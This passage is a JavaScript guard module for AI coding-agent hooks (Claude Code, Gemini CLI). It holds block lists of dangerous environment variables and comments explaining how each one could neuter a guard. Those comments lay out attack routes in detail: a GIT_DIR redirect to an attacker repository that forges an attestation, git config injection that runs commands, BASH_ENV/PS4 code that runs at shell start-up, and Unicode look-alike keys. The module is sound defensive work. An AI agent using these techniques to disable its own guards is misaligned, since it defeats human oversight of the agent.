  // a sanctioned-test-context predicate (or a build-time strip) at each seam and
  // is tracked as the second shard of loom#1450 — see the § RESIDUAL note in the
  // PR body. This entry is real defense-in-depth, NOT a claim the family is shut.
  // ── #1471 F2: the namespace, not the two families ─────────────────────────
  // COC_TEST_ + COC_XECO_ subsume into COC_ because enumerating sub-families
  // repeats at the PREFIX layer the same bug the prefixes were introduced to
  // end. Measured against this file's own predicate before the widening: of the
  // COC_ vars `.claude/hooks/` actually reads, five answered UNGATED —
  // COC_SIGNING_MUTATION_GUARD_FORCE_DEGRADED (forces a guard degraded),
  // COC_PORCELAIN_OVERRIDE (documented precedence over the production porcelain
  // primitive), COC_REF_PROBE_TIMEOUT_MS, COC_SS_BANNER_OUT, COC_RUNTIME.
  // The first two are guard-control seams reachable from a settings.json `env`
  // block, which is the exact delivery path this file exists to fence.
  //
  // The blast radius on legitimate use is empty, which is what makes the
  // blanket the right shape and not merely the safe one: every
  // `process.env.COC_*` read under `.claude/hooks/` is a guard-control seam
  // (identity, root relocation, test injection, or cross-ecosystem authority),
  // and the live settings.json `env` block declares no COC_ key. COC_RUNTIME —
  // the one non-test, non-identity member — is consumed only by
  // `lib/runtime.js::parseHook` on the Codex lane, where the guard stamps it
  // into the replayed-hook subprocess env itself rather than reading it from
  // settings.
  "COC_",
  // ── #1462 F1 Class-G: GIT ENVIRONMENT (defense-in-depth ONLY) ──────────────
  // READ THE SCOPE NOTE BELOW BEFORE TREATING F1 AS CLOSED.
  //
  // coordination-mode.js's `_committedDisableAttested` runs
  //   execFileSync("git", ["-C", repoDir, "show", "HEAD:.claude/bin/ecosystem.json"], {...})
  // with NO `env:` option, so the child inherits the ambient environment.
  // GIT_DIR takes precedence over repository discovery (`-C` only changes
  // DIRECTORY, it does not pin the repo), so GIT_DIR=/tmp/evil.git makes the
  // attested blob come from an attacker-controlled repository and the
  // attestation returns true for a file never committed anywhere. Composed with
  // the #1462 F9 variable-path residual that is a complete agent-reachable
  // disable of the coordination master switch.
  //
  // WHY A PREFIX AND NOT EXACT ENTRIES — this is forced, not stylistic. The
  // numbered config pairs GIT_CONFIG_KEY_<n> / GIT_CONFIG_VALUE_<n> with
  // GIT_CONFIG_COUNT are UNBOUNDED in n (git 2.31+), and they inject arbitrary
  // config — including `core.pager` and `core.hooksPath`, i.e. command
  // execution. Verified on git 2.50.1: GIT_CONFIG_COUNT=2 injecting both keys
  // read back through `git config --get`. No finite list of exact names can
  // cover an unbounded index, so an exact-entry denylist is not merely
  // incomplete here, it is structurally unable to close the family. Same
  // argument the COC_TEST_ / COC_XECO_ prefixes above make.
  //
  // The family is wider than the object-store redirect that motivated it:
  // GIT_WORK_TREE / GIT_COMMON_DIR / GIT_OBJECT_DIRECTORY /
  // GIT_ALTERNATE_OBJECT_DIRECTORIES / GIT_INDEX_FILE / GIT_CEILING_DIRECTORIES
  // / GIT_NAMESPACE all relocate what `git show` resolves against, and
  // GIT_SSH_COMMAND / GIT_PROXY_COMMAND / GIT_EXTERNAL_DIFF / GIT_PAGER /
  // GIT_EDITOR / GIT_ASKPASS / GIT_TEMPLATE_DIR are commands git invokes on our
  // behalf. Enumerating them one review at a time is the treadmill this prefix
  // exists to end.
  //
  // OVER-FLAG COST, deliberately accepted: `GIT_AUTHOR_NAME` /
  // `GIT_COMMITTER_EMAIL` and similar benign identity keys also gate. Per the
  // case-folding rationale above, a harmless over-flag costs only a benign
  // settings key its dangerous-name spelling — and git identity belongs in git
  // config, not in a CC settings `env` block. Fail-closed is the right trade.
  //
  // SCOPE — THIS IS DEFENSE IN DEPTH, NOT THE FENCE. Like every entry in this
  // module it fences ONLY the settings.json `env` CONTENT surface. A HOST/SHELL
  // export of GIT_DIR is completely untouched by it, and a denylist is
  // permanently one variable behind whatever git adds next. The PRIMARY,
  // structural fix is a positive allowlist at the read site: pass an explicit
  // minimal `env` to the subprocess and resolve `git` by absolute path
  // (coordination-mode.js, #1462 AC-1, a separate lane). That closes the class
  // regardless of this list. A green test on this entry is NOT evidence F1 is
  // closed.
  "GIT_",
];

// Case-folded projections (F14) — Windows env keys fold case, so compare lower-cased.
const DANGEROUS_ENV_EXACT_LC = new Set(
  [...DANGEROUS_ENV_EXACT].map((k) => k.toLowerCase()),
);
const DANGEROUS_ENV_PREFIX_LC = DANGEROUS_ENV_PREFIX.map((p) =>
  p.toLowerCase(),
);

// Is `key` an env var that can neuter a guard while its registration stays byte-identical — either
// by redirecting the guard command's node execution / path, or (#1429) by redirecting the POLICY
// CONFIG a guard consults? Case-folded (F14) so a Windows-effective `Path` / `Node_Options` /
// `dyld_*` is caught (fail-closed on Unix).
//
// SHAPE FIRST (M-W4.3 RUN 8 R2 Q3). The name match below is exact after a case fold, so a key that
// is not a plain env-var name escaped it: `CLAUDE_CODE_SHELL_PREFIX ` (trailing space), Cyrillic
// `ОPENSSL_CONF`, long-s `OPENſſL_CONF`. CC applies settings env under the ORIGINAL key, and on
// Windows the env lookup ignores case — whether a look-alike resolves to the real name there is
// UNANSWERED. So any key outside ENV_NAME_SHAPE is refused before the name match (fail-closed: no
// legitimate settings env key needs another character), and so is `__proto__`, whose behaviour in
// CC's env merge was not traced.
const ENV_NAME_SHAPE = /^[A-Za-z_][A-Za-z0-9_]*$/;
function isDangerousEnvKey(key) {
  if (typeof key !== "string") return false;
  if (!ENV_NAME_SHAPE.test(key)) return true;
  const k = key.toLowerCase();
  if (k === "__proto__") return true;
  return (
    DANGEROUS_ENV_EXACT_LC.has(k) ||
    DANGEROUS_ENV_PREFIX_LC.some((p) => k.startsWith(p))
  );
}

// The dangerous env keys currently present in a parsed settings object's `env` block.
function dangerousEnvKeys(obj) {
  const env = obj && typeof obj.env === "object" && obj.env ? obj.env : {};
  return Object.keys(env).filter(isDangerousEnvKey);
}

// The dangerous env keys an edit ADDED or CHANGED (before → after). These redirect the guard
// command's runtime resolution, so the edit is an under-protection (L1 blocks it). A key
// already present with an unchanged value is NOT re-flagged (L3 advises on a pre-existing one).
function envKeysAddedOrChanged(beforeObj, afterObj) {
  const b =
    beforeObj && typeof beforeObj.env === "object" && beforeObj.env
      ? beforeObj.env
      : {};
  const a =
    afterObj && typeof afterObj.env === "object" && afterObj.env
      ? afterObj.env
      : {};
  const out = [];
  for (const k of Object.keys(a)) {
    if (!isDangerousEnvKey(k)) continue;
    if (!(k in b) || b[k] !== a[k]) out.push(k);
  }
  return out;
}

// Every OWN `__proto__` key in a parsed JSON value, at ANY depth, as a `$.a.b[0].__proto__` path
// (M-W4.3 RUN 8 R2 LOW). isDangerousEnvKey refuses it as an env key only; JSON.parse makes it an own
// property anywhere — `{"__proto__":{"env":{…}}}` at the top level, or inside `permissions` — and a
// merge that copies keys can apply it as a prototype. ITERATIVE, not recursive: a deeply nested body
// must not overflow the stack, since the guard's catch-all would turn that throw into a passthrough.
function ownProtoKeyPaths(value) {
  const out = [];
  const stack = [[value, "$"]];
  while (stack.length) {
    const [v, at] = stack.pop();
    if (v === null || typeof v !== "object") continue;
    const isArr = Array.isArray(v);
    for (const k of Object.keys(v)) {
      if (k === "__proto__") out.push(`${at}.__proto__`);
      stack.push([v[k], isArr ? `${at}[${k}]` : `${at}.${k}`]);
    }
  }
  return out;
}

// THE LOADER KEYS — names that make node or the dynamic loader run code, or change how a require
// resolves, before a process's first line. A DIFFERENT question from isDangerousEnvKey above
// ("which env keys may a settings file carry"). Since R2 HIGH-1 (ROOT ruling A) this set is NOT
// the guard child's filter: a guard child gets an ALLOWLISTED env (isGuardChildEnvKey below), so
// a key nobody listed — GIT_*, XDG_CONFIG_HOME, CLAUDE_TRUST_STATE_DIR, anything Gemini copied
// in from a `.env` — never reaches it. What this set still decides is the CONTENT fence on a
// Gemini env file (dotenvLoaderKeys), together with isHookShellStartupEnvKey. It lives here so
// env-key membership is decided in ONE module (#1471; env-denyset-predicate-1471.test.js).
// Case-insensitive.
const CHILD_LOADER_ENV_EXACT = new Set([
  "NODE_OPTIONS",
  "NODE_PATH",
  "NODE_PRESERVE_SYMLINKS",
  "NODE_REPL_EXTERNAL_MODULE",
  "LD_PRELOAD",
  "LD_LIBRARY_PATH",
  "LD_AUDIT",
]);
const CHILD_LOADER_ENV_PREFIX = ["DYLD_"];
function isChildLoaderEnvKey(key) {
  const K = String(key).toUpperCase();
  return CHILD_LOADER_ENV_EXACT.has(K) || CHILD_LOADER_ENV_PREFIX.some((p) => K.startsWith(p));
}

// THE HOOK SHELL'S START-UP KEYS. Gemini runs every hook command as `bash -c <command>` with its
// own environment, a loaded `.env` included (Gemini CLI 0.41.2 bundle, chunk-6DSAZLFF.js
// `getShellConfiguration` -> `{ executable: "bash", argsPrefix: ["-c"] }`, and
// `HookRunner.executeCommandHook`, which spawns it with `...sanitizeEnvironment(process.env)`).
// That bash starts BEFORE the command's `env -i` can clear anything, and a non-interactive bash
// runs code named by these keys at start-up: BASH_ENV is sourced; SHELLOPTS imports options such
// as xtrace, whose PS4 is then expanded (a `$(…)` in it runs); BASHOPTS imports shopt options;
// BASH_FUNC_<name>%% imports a function over a command name (a dotenv key cannot carry `%`, so
// that one is listed for completeness). ENV is not here: bash reads it only for an INTERACTIVE
// POSIX-mode shell, never for `bash -c`.
// MEASURED here: `BASH_ENV=<file> bash -c 'exec env -i … /usr/bin/true; exit 2'` ran <file>, and
// `SHELLOPTS=xtrace PS4='$(echo …)'` ran the substitution, each before `env -i`. So the content
// fence refuses them too; the loader keys above also act on the bash binary itself.
const HOOK_SHELL_STARTUP_ENV_EXACT = new Set(["BASH_ENV", "SHELLOPTS", "BASHOPTS"]);
const HOOK_SHELL_STARTUP_ENV_PREFIX = ["BASH_FUNC_"];
function isHookShellStartupEnvKey(key) {
  const K = String(key).toUpperCase();
  return HOOK_SHELL_STARTUP_ENV_EXACT.has(K) || HOOK_SHELL_STARTUP_ENV_PREFIX.some((p) => K.startsWith(p));
}

// THE GUARD CHILD'S ENVIRONMENT (R2 HIGH-1, ROOT ruling A2) — an ALLOWLIST, not a scrub. A guard
// a hook runtime spawns (gemini-hook-runtime.js::scrubEnv) receives ONLY these inherited names,
// plus the two the runtime sets itself (COC_RUNTIME, CLAUDE_PROJECT_DIR). Every other name is
// dropped, whatever it is called and however it got into the parent's environment. MEASURED from
// the require closure of every guard the Gemini adapter runs: PATH (git-subprocess-env.js resolves
// `git` from it) and HOME (os.homedir(); the settings guard's ~/.claude fence) are the only
// non-test names they need that the runtime does not set. CLAUDE_CONFIG_DIR is deliberately NOT
// here: it is a dangerous settings key (DANGEROUS_ENV_EXACT) a `.env` can plant when unset, so on
// Gemini the settings guard fences ~/.claude and not a csq per-terminal config dir. On win32 the
// OS-set names a node child needs to start (SystemRoot, …) are added; Windows env names fold case
// there, so the comparison folds case on win32 only — on POSIX `path` is not `PATH`.
const GUARD_CHILD_ENV_ALLOW = Object.freeze(["PATH", "HOME"]);
const GUARD_CHILD_ENV_ALLOW_WIN32 = Object.freeze(["SYSTEMROOT", "WINDIR", "PATHEXT", "COMSPEC", "USERPROFILE", "TEMP", "TMP"]);
function isGuardChildEnvKey(key, platform = process.platform) {
  if (typeof key !== "string") return false;
  if (platform === "win32") {
    const K = key.toUpperCase();
    return GUARD_CHILD_ENV_ALLOW.includes(K) || GUARD_CHILD_ENV_ALLOW_WIN32.includes(K);
  }
  return GUARD_CHILD_ENV_ALLOW.includes(key);
}

// ── THE GEMINI ENV FILE (R1 HIGH-1) ───────────────────────────────────────────────────────────
// Gemini loads ONE dotenv file into its own process.env at start-up, and every hook process it
// starts inherits it. MEASURED by reading the installed Gemini CLI 0.41.2 bundle
// (chunk-5A3LI34G.js `findEnvFile` + `loadEnvironment`): from the workspace dir UP to the
// filesystem root it takes the first of `<dir>/.gemini/.env` (trusted workspace only) and
// `<dir>/.env`, then `~/.gemini/.env` (trusted) and `~/.env`; it parses it with `dotenv.parse`
// and sets every key not already in process.env, and the `advanced.excludedEnvVars` list is
// skipped for a `.gemini/.env`. The workspace can be any directory, so EVERY file named `.env` is
// one Gemini may load — the four named copies are the common case, not the boundary.
//
// THE BOUNDARY IS STRUCTURAL (R2 HIGH-1, ROOT ruling A): every Gemini hook command starts the
// adapter through `exec env -i PATH=… HOME=… node …` (gemini-hook-runtime.js::
// registrationCommand), so no key from that file reaches the adapter's node, and the adapter
// hands each guard an allowlisted env (isGuardChildEnvKey). This content fence is DEPTH, and it
// covers the one stage the structural fix cannot: the `bash -c` Gemini wraps the command in,
// which starts before `env -i` (isHookShellStartupEnvKey), and the loader keys that act on that
// bash binary (isChildLoaderEnvKey). Which keys are refused is isDotenvForbiddenKey's question,
// answered here and nowhere else.

// A basename as the OS will open it, folded the way settings-deny-edit-guard.js::foldBasename
// folds a settings name (NFKC, an NTFS stream suffix, a Win32 trailing dot/space, case).
function foldEnvBasename(name) {
  return String(name).normalize("NFKC").split(":")[0].replace(/[.\s]+$/u, "").toLowerCase();
}
/** Is `name` (a basename) a file Gemini's env loader opens? */
function isGeminiEnvFileName(name) {
  return foldEnvBasename(name) === ".env";
}
/**
 * The Bash-lane spelling of such a file, for violation-patterns.js::
 * detectStateFileMutationSegmentAware: a path whose LAST component is `.env` (any case; a
 * Win32 trailing dot), preceded by a path or shell-word boundary. `.env.example`, `.envrc` and
 * `foo.env` are not it.
 */
const GEMINI_ENV_FILE_RX = /(?:^|[\/\\\s'"=<>|;&(`:])\.env\.*(?![A-Za-z0-9_.\-])/i;
/** A key the content fence refuses in a Gemini env file: a loader key or a hook-shell start-up key. */
function isDotenvForbiddenKey(key) {
  return isChildLoaderEnvKey(key) || isHookShellStartupEnvKey(key);
}
/**
 * Every forbidden key (isDotenvForbiddenKey) a dotenv TEXT names, as a sorted unique list. Every
 * identifier-shaped run in the text is a candidate — keys, values and comments alike — and the
 * text is ALSO read with every backslash removed, because a backslash can split a name. An
 * over-approximation by design: a comment naming NODE_OPTIONS reds too. No legitimate env file
 * an agent writes needs one of these keys, and the human edits one from their own terminal. A
 * host that TRANSFORMS the text before writing it is not modelled here: the caller refuses a
 * write the host would transform (geminiWriteFileConverts).
 */
function dotenvLoaderKeys(text) {
  if (typeof text !== "string" || !text) return [];
  const out = new Set();
  for (const view of [text, text.replace(/\\/g, "")]) {
    for (const tok of view.split(/[^A-Za-z0-9_]+/)) if (tok && isDotenvForbiddenKey(tok)) out.add(tok);
  }
  return [...out].sort();
}

/**
 * Gemini write_file's escape conversion, ported VERBATIM from the installed Gemini CLI 0.41.2
 * bundle (chunk-6DSAZLFF.js `unescapeStringForGeminiBug`, :272025-272056). write_file applies it
 * through `ensureCorrectFileContent` (:271949-271970, called at :272086-272087): when the
 * conversion would change the content, the bytes written are the CONVERTED text (LLM correction
 * off, a non-Gemini-3 model), the ORIGINAL text (LLM correction off, a Gemini-3 model), or
 * whatever an LLM rewrite of it returns (LLM correction on) — and only when the conversion
 * changes NOTHING are the bytes written exactly the content the hook saw. A `\n` before a key is
 * the case that matters: `A=1\nNODE_OPTIONS=…` names no loader key in either view the fence
 * reads (the token is `nNODE_OPTIONS`), and is two lines on disk.
 */
function geminiWriteFileUnescape(inputString) {
  return String(inputString).replace(/\\+(n|t|r|'|"|`|\\|\n)/g, (match, capturedChar) => {
    switch (capturedChar) {
      case "n":
        return "\n";
      case "t":
        return "\t";
      case "r":
        return "\r";
      case "'":
        return "'";
      case '"':
        return '"';
      case "`":
        return "`";
      case "\\":
        return "\\";
      case "\n":
        return "\n";
      default:
        return match;
    }
  });
}
/** Would Gemini's write_file write something other than `content`? (See geminiWriteFileUnescape.) */
function geminiWriteFileConverts(content) {
  return typeof content === "string" && geminiWriteFileUnescape(content) !== content;
}

module.exports = {
  invokesGuard,
  canonicalGuardCommand,
  isDangerousEnvKey,
  dangerousEnvKeys,
  envKeysAddedOrChanged,
  ownProtoKeyPaths,
  isChildLoaderEnvKey,
  isHookShellStartupEnvKey,
  isDotenvForbiddenKey,
  GUARD_CHILD_ENV_ALLOW,
  GUARD_CHILD_ENV_ALLOW_WIN32,
  isGuardChildEnvKey,
  isGeminiEnvFileName,
  GEMINI_ENV_FILE_RX,
  dotenvLoaderKeys,
  geminiWriteFileUnescape,
  geminiWriteFileConverts,
};
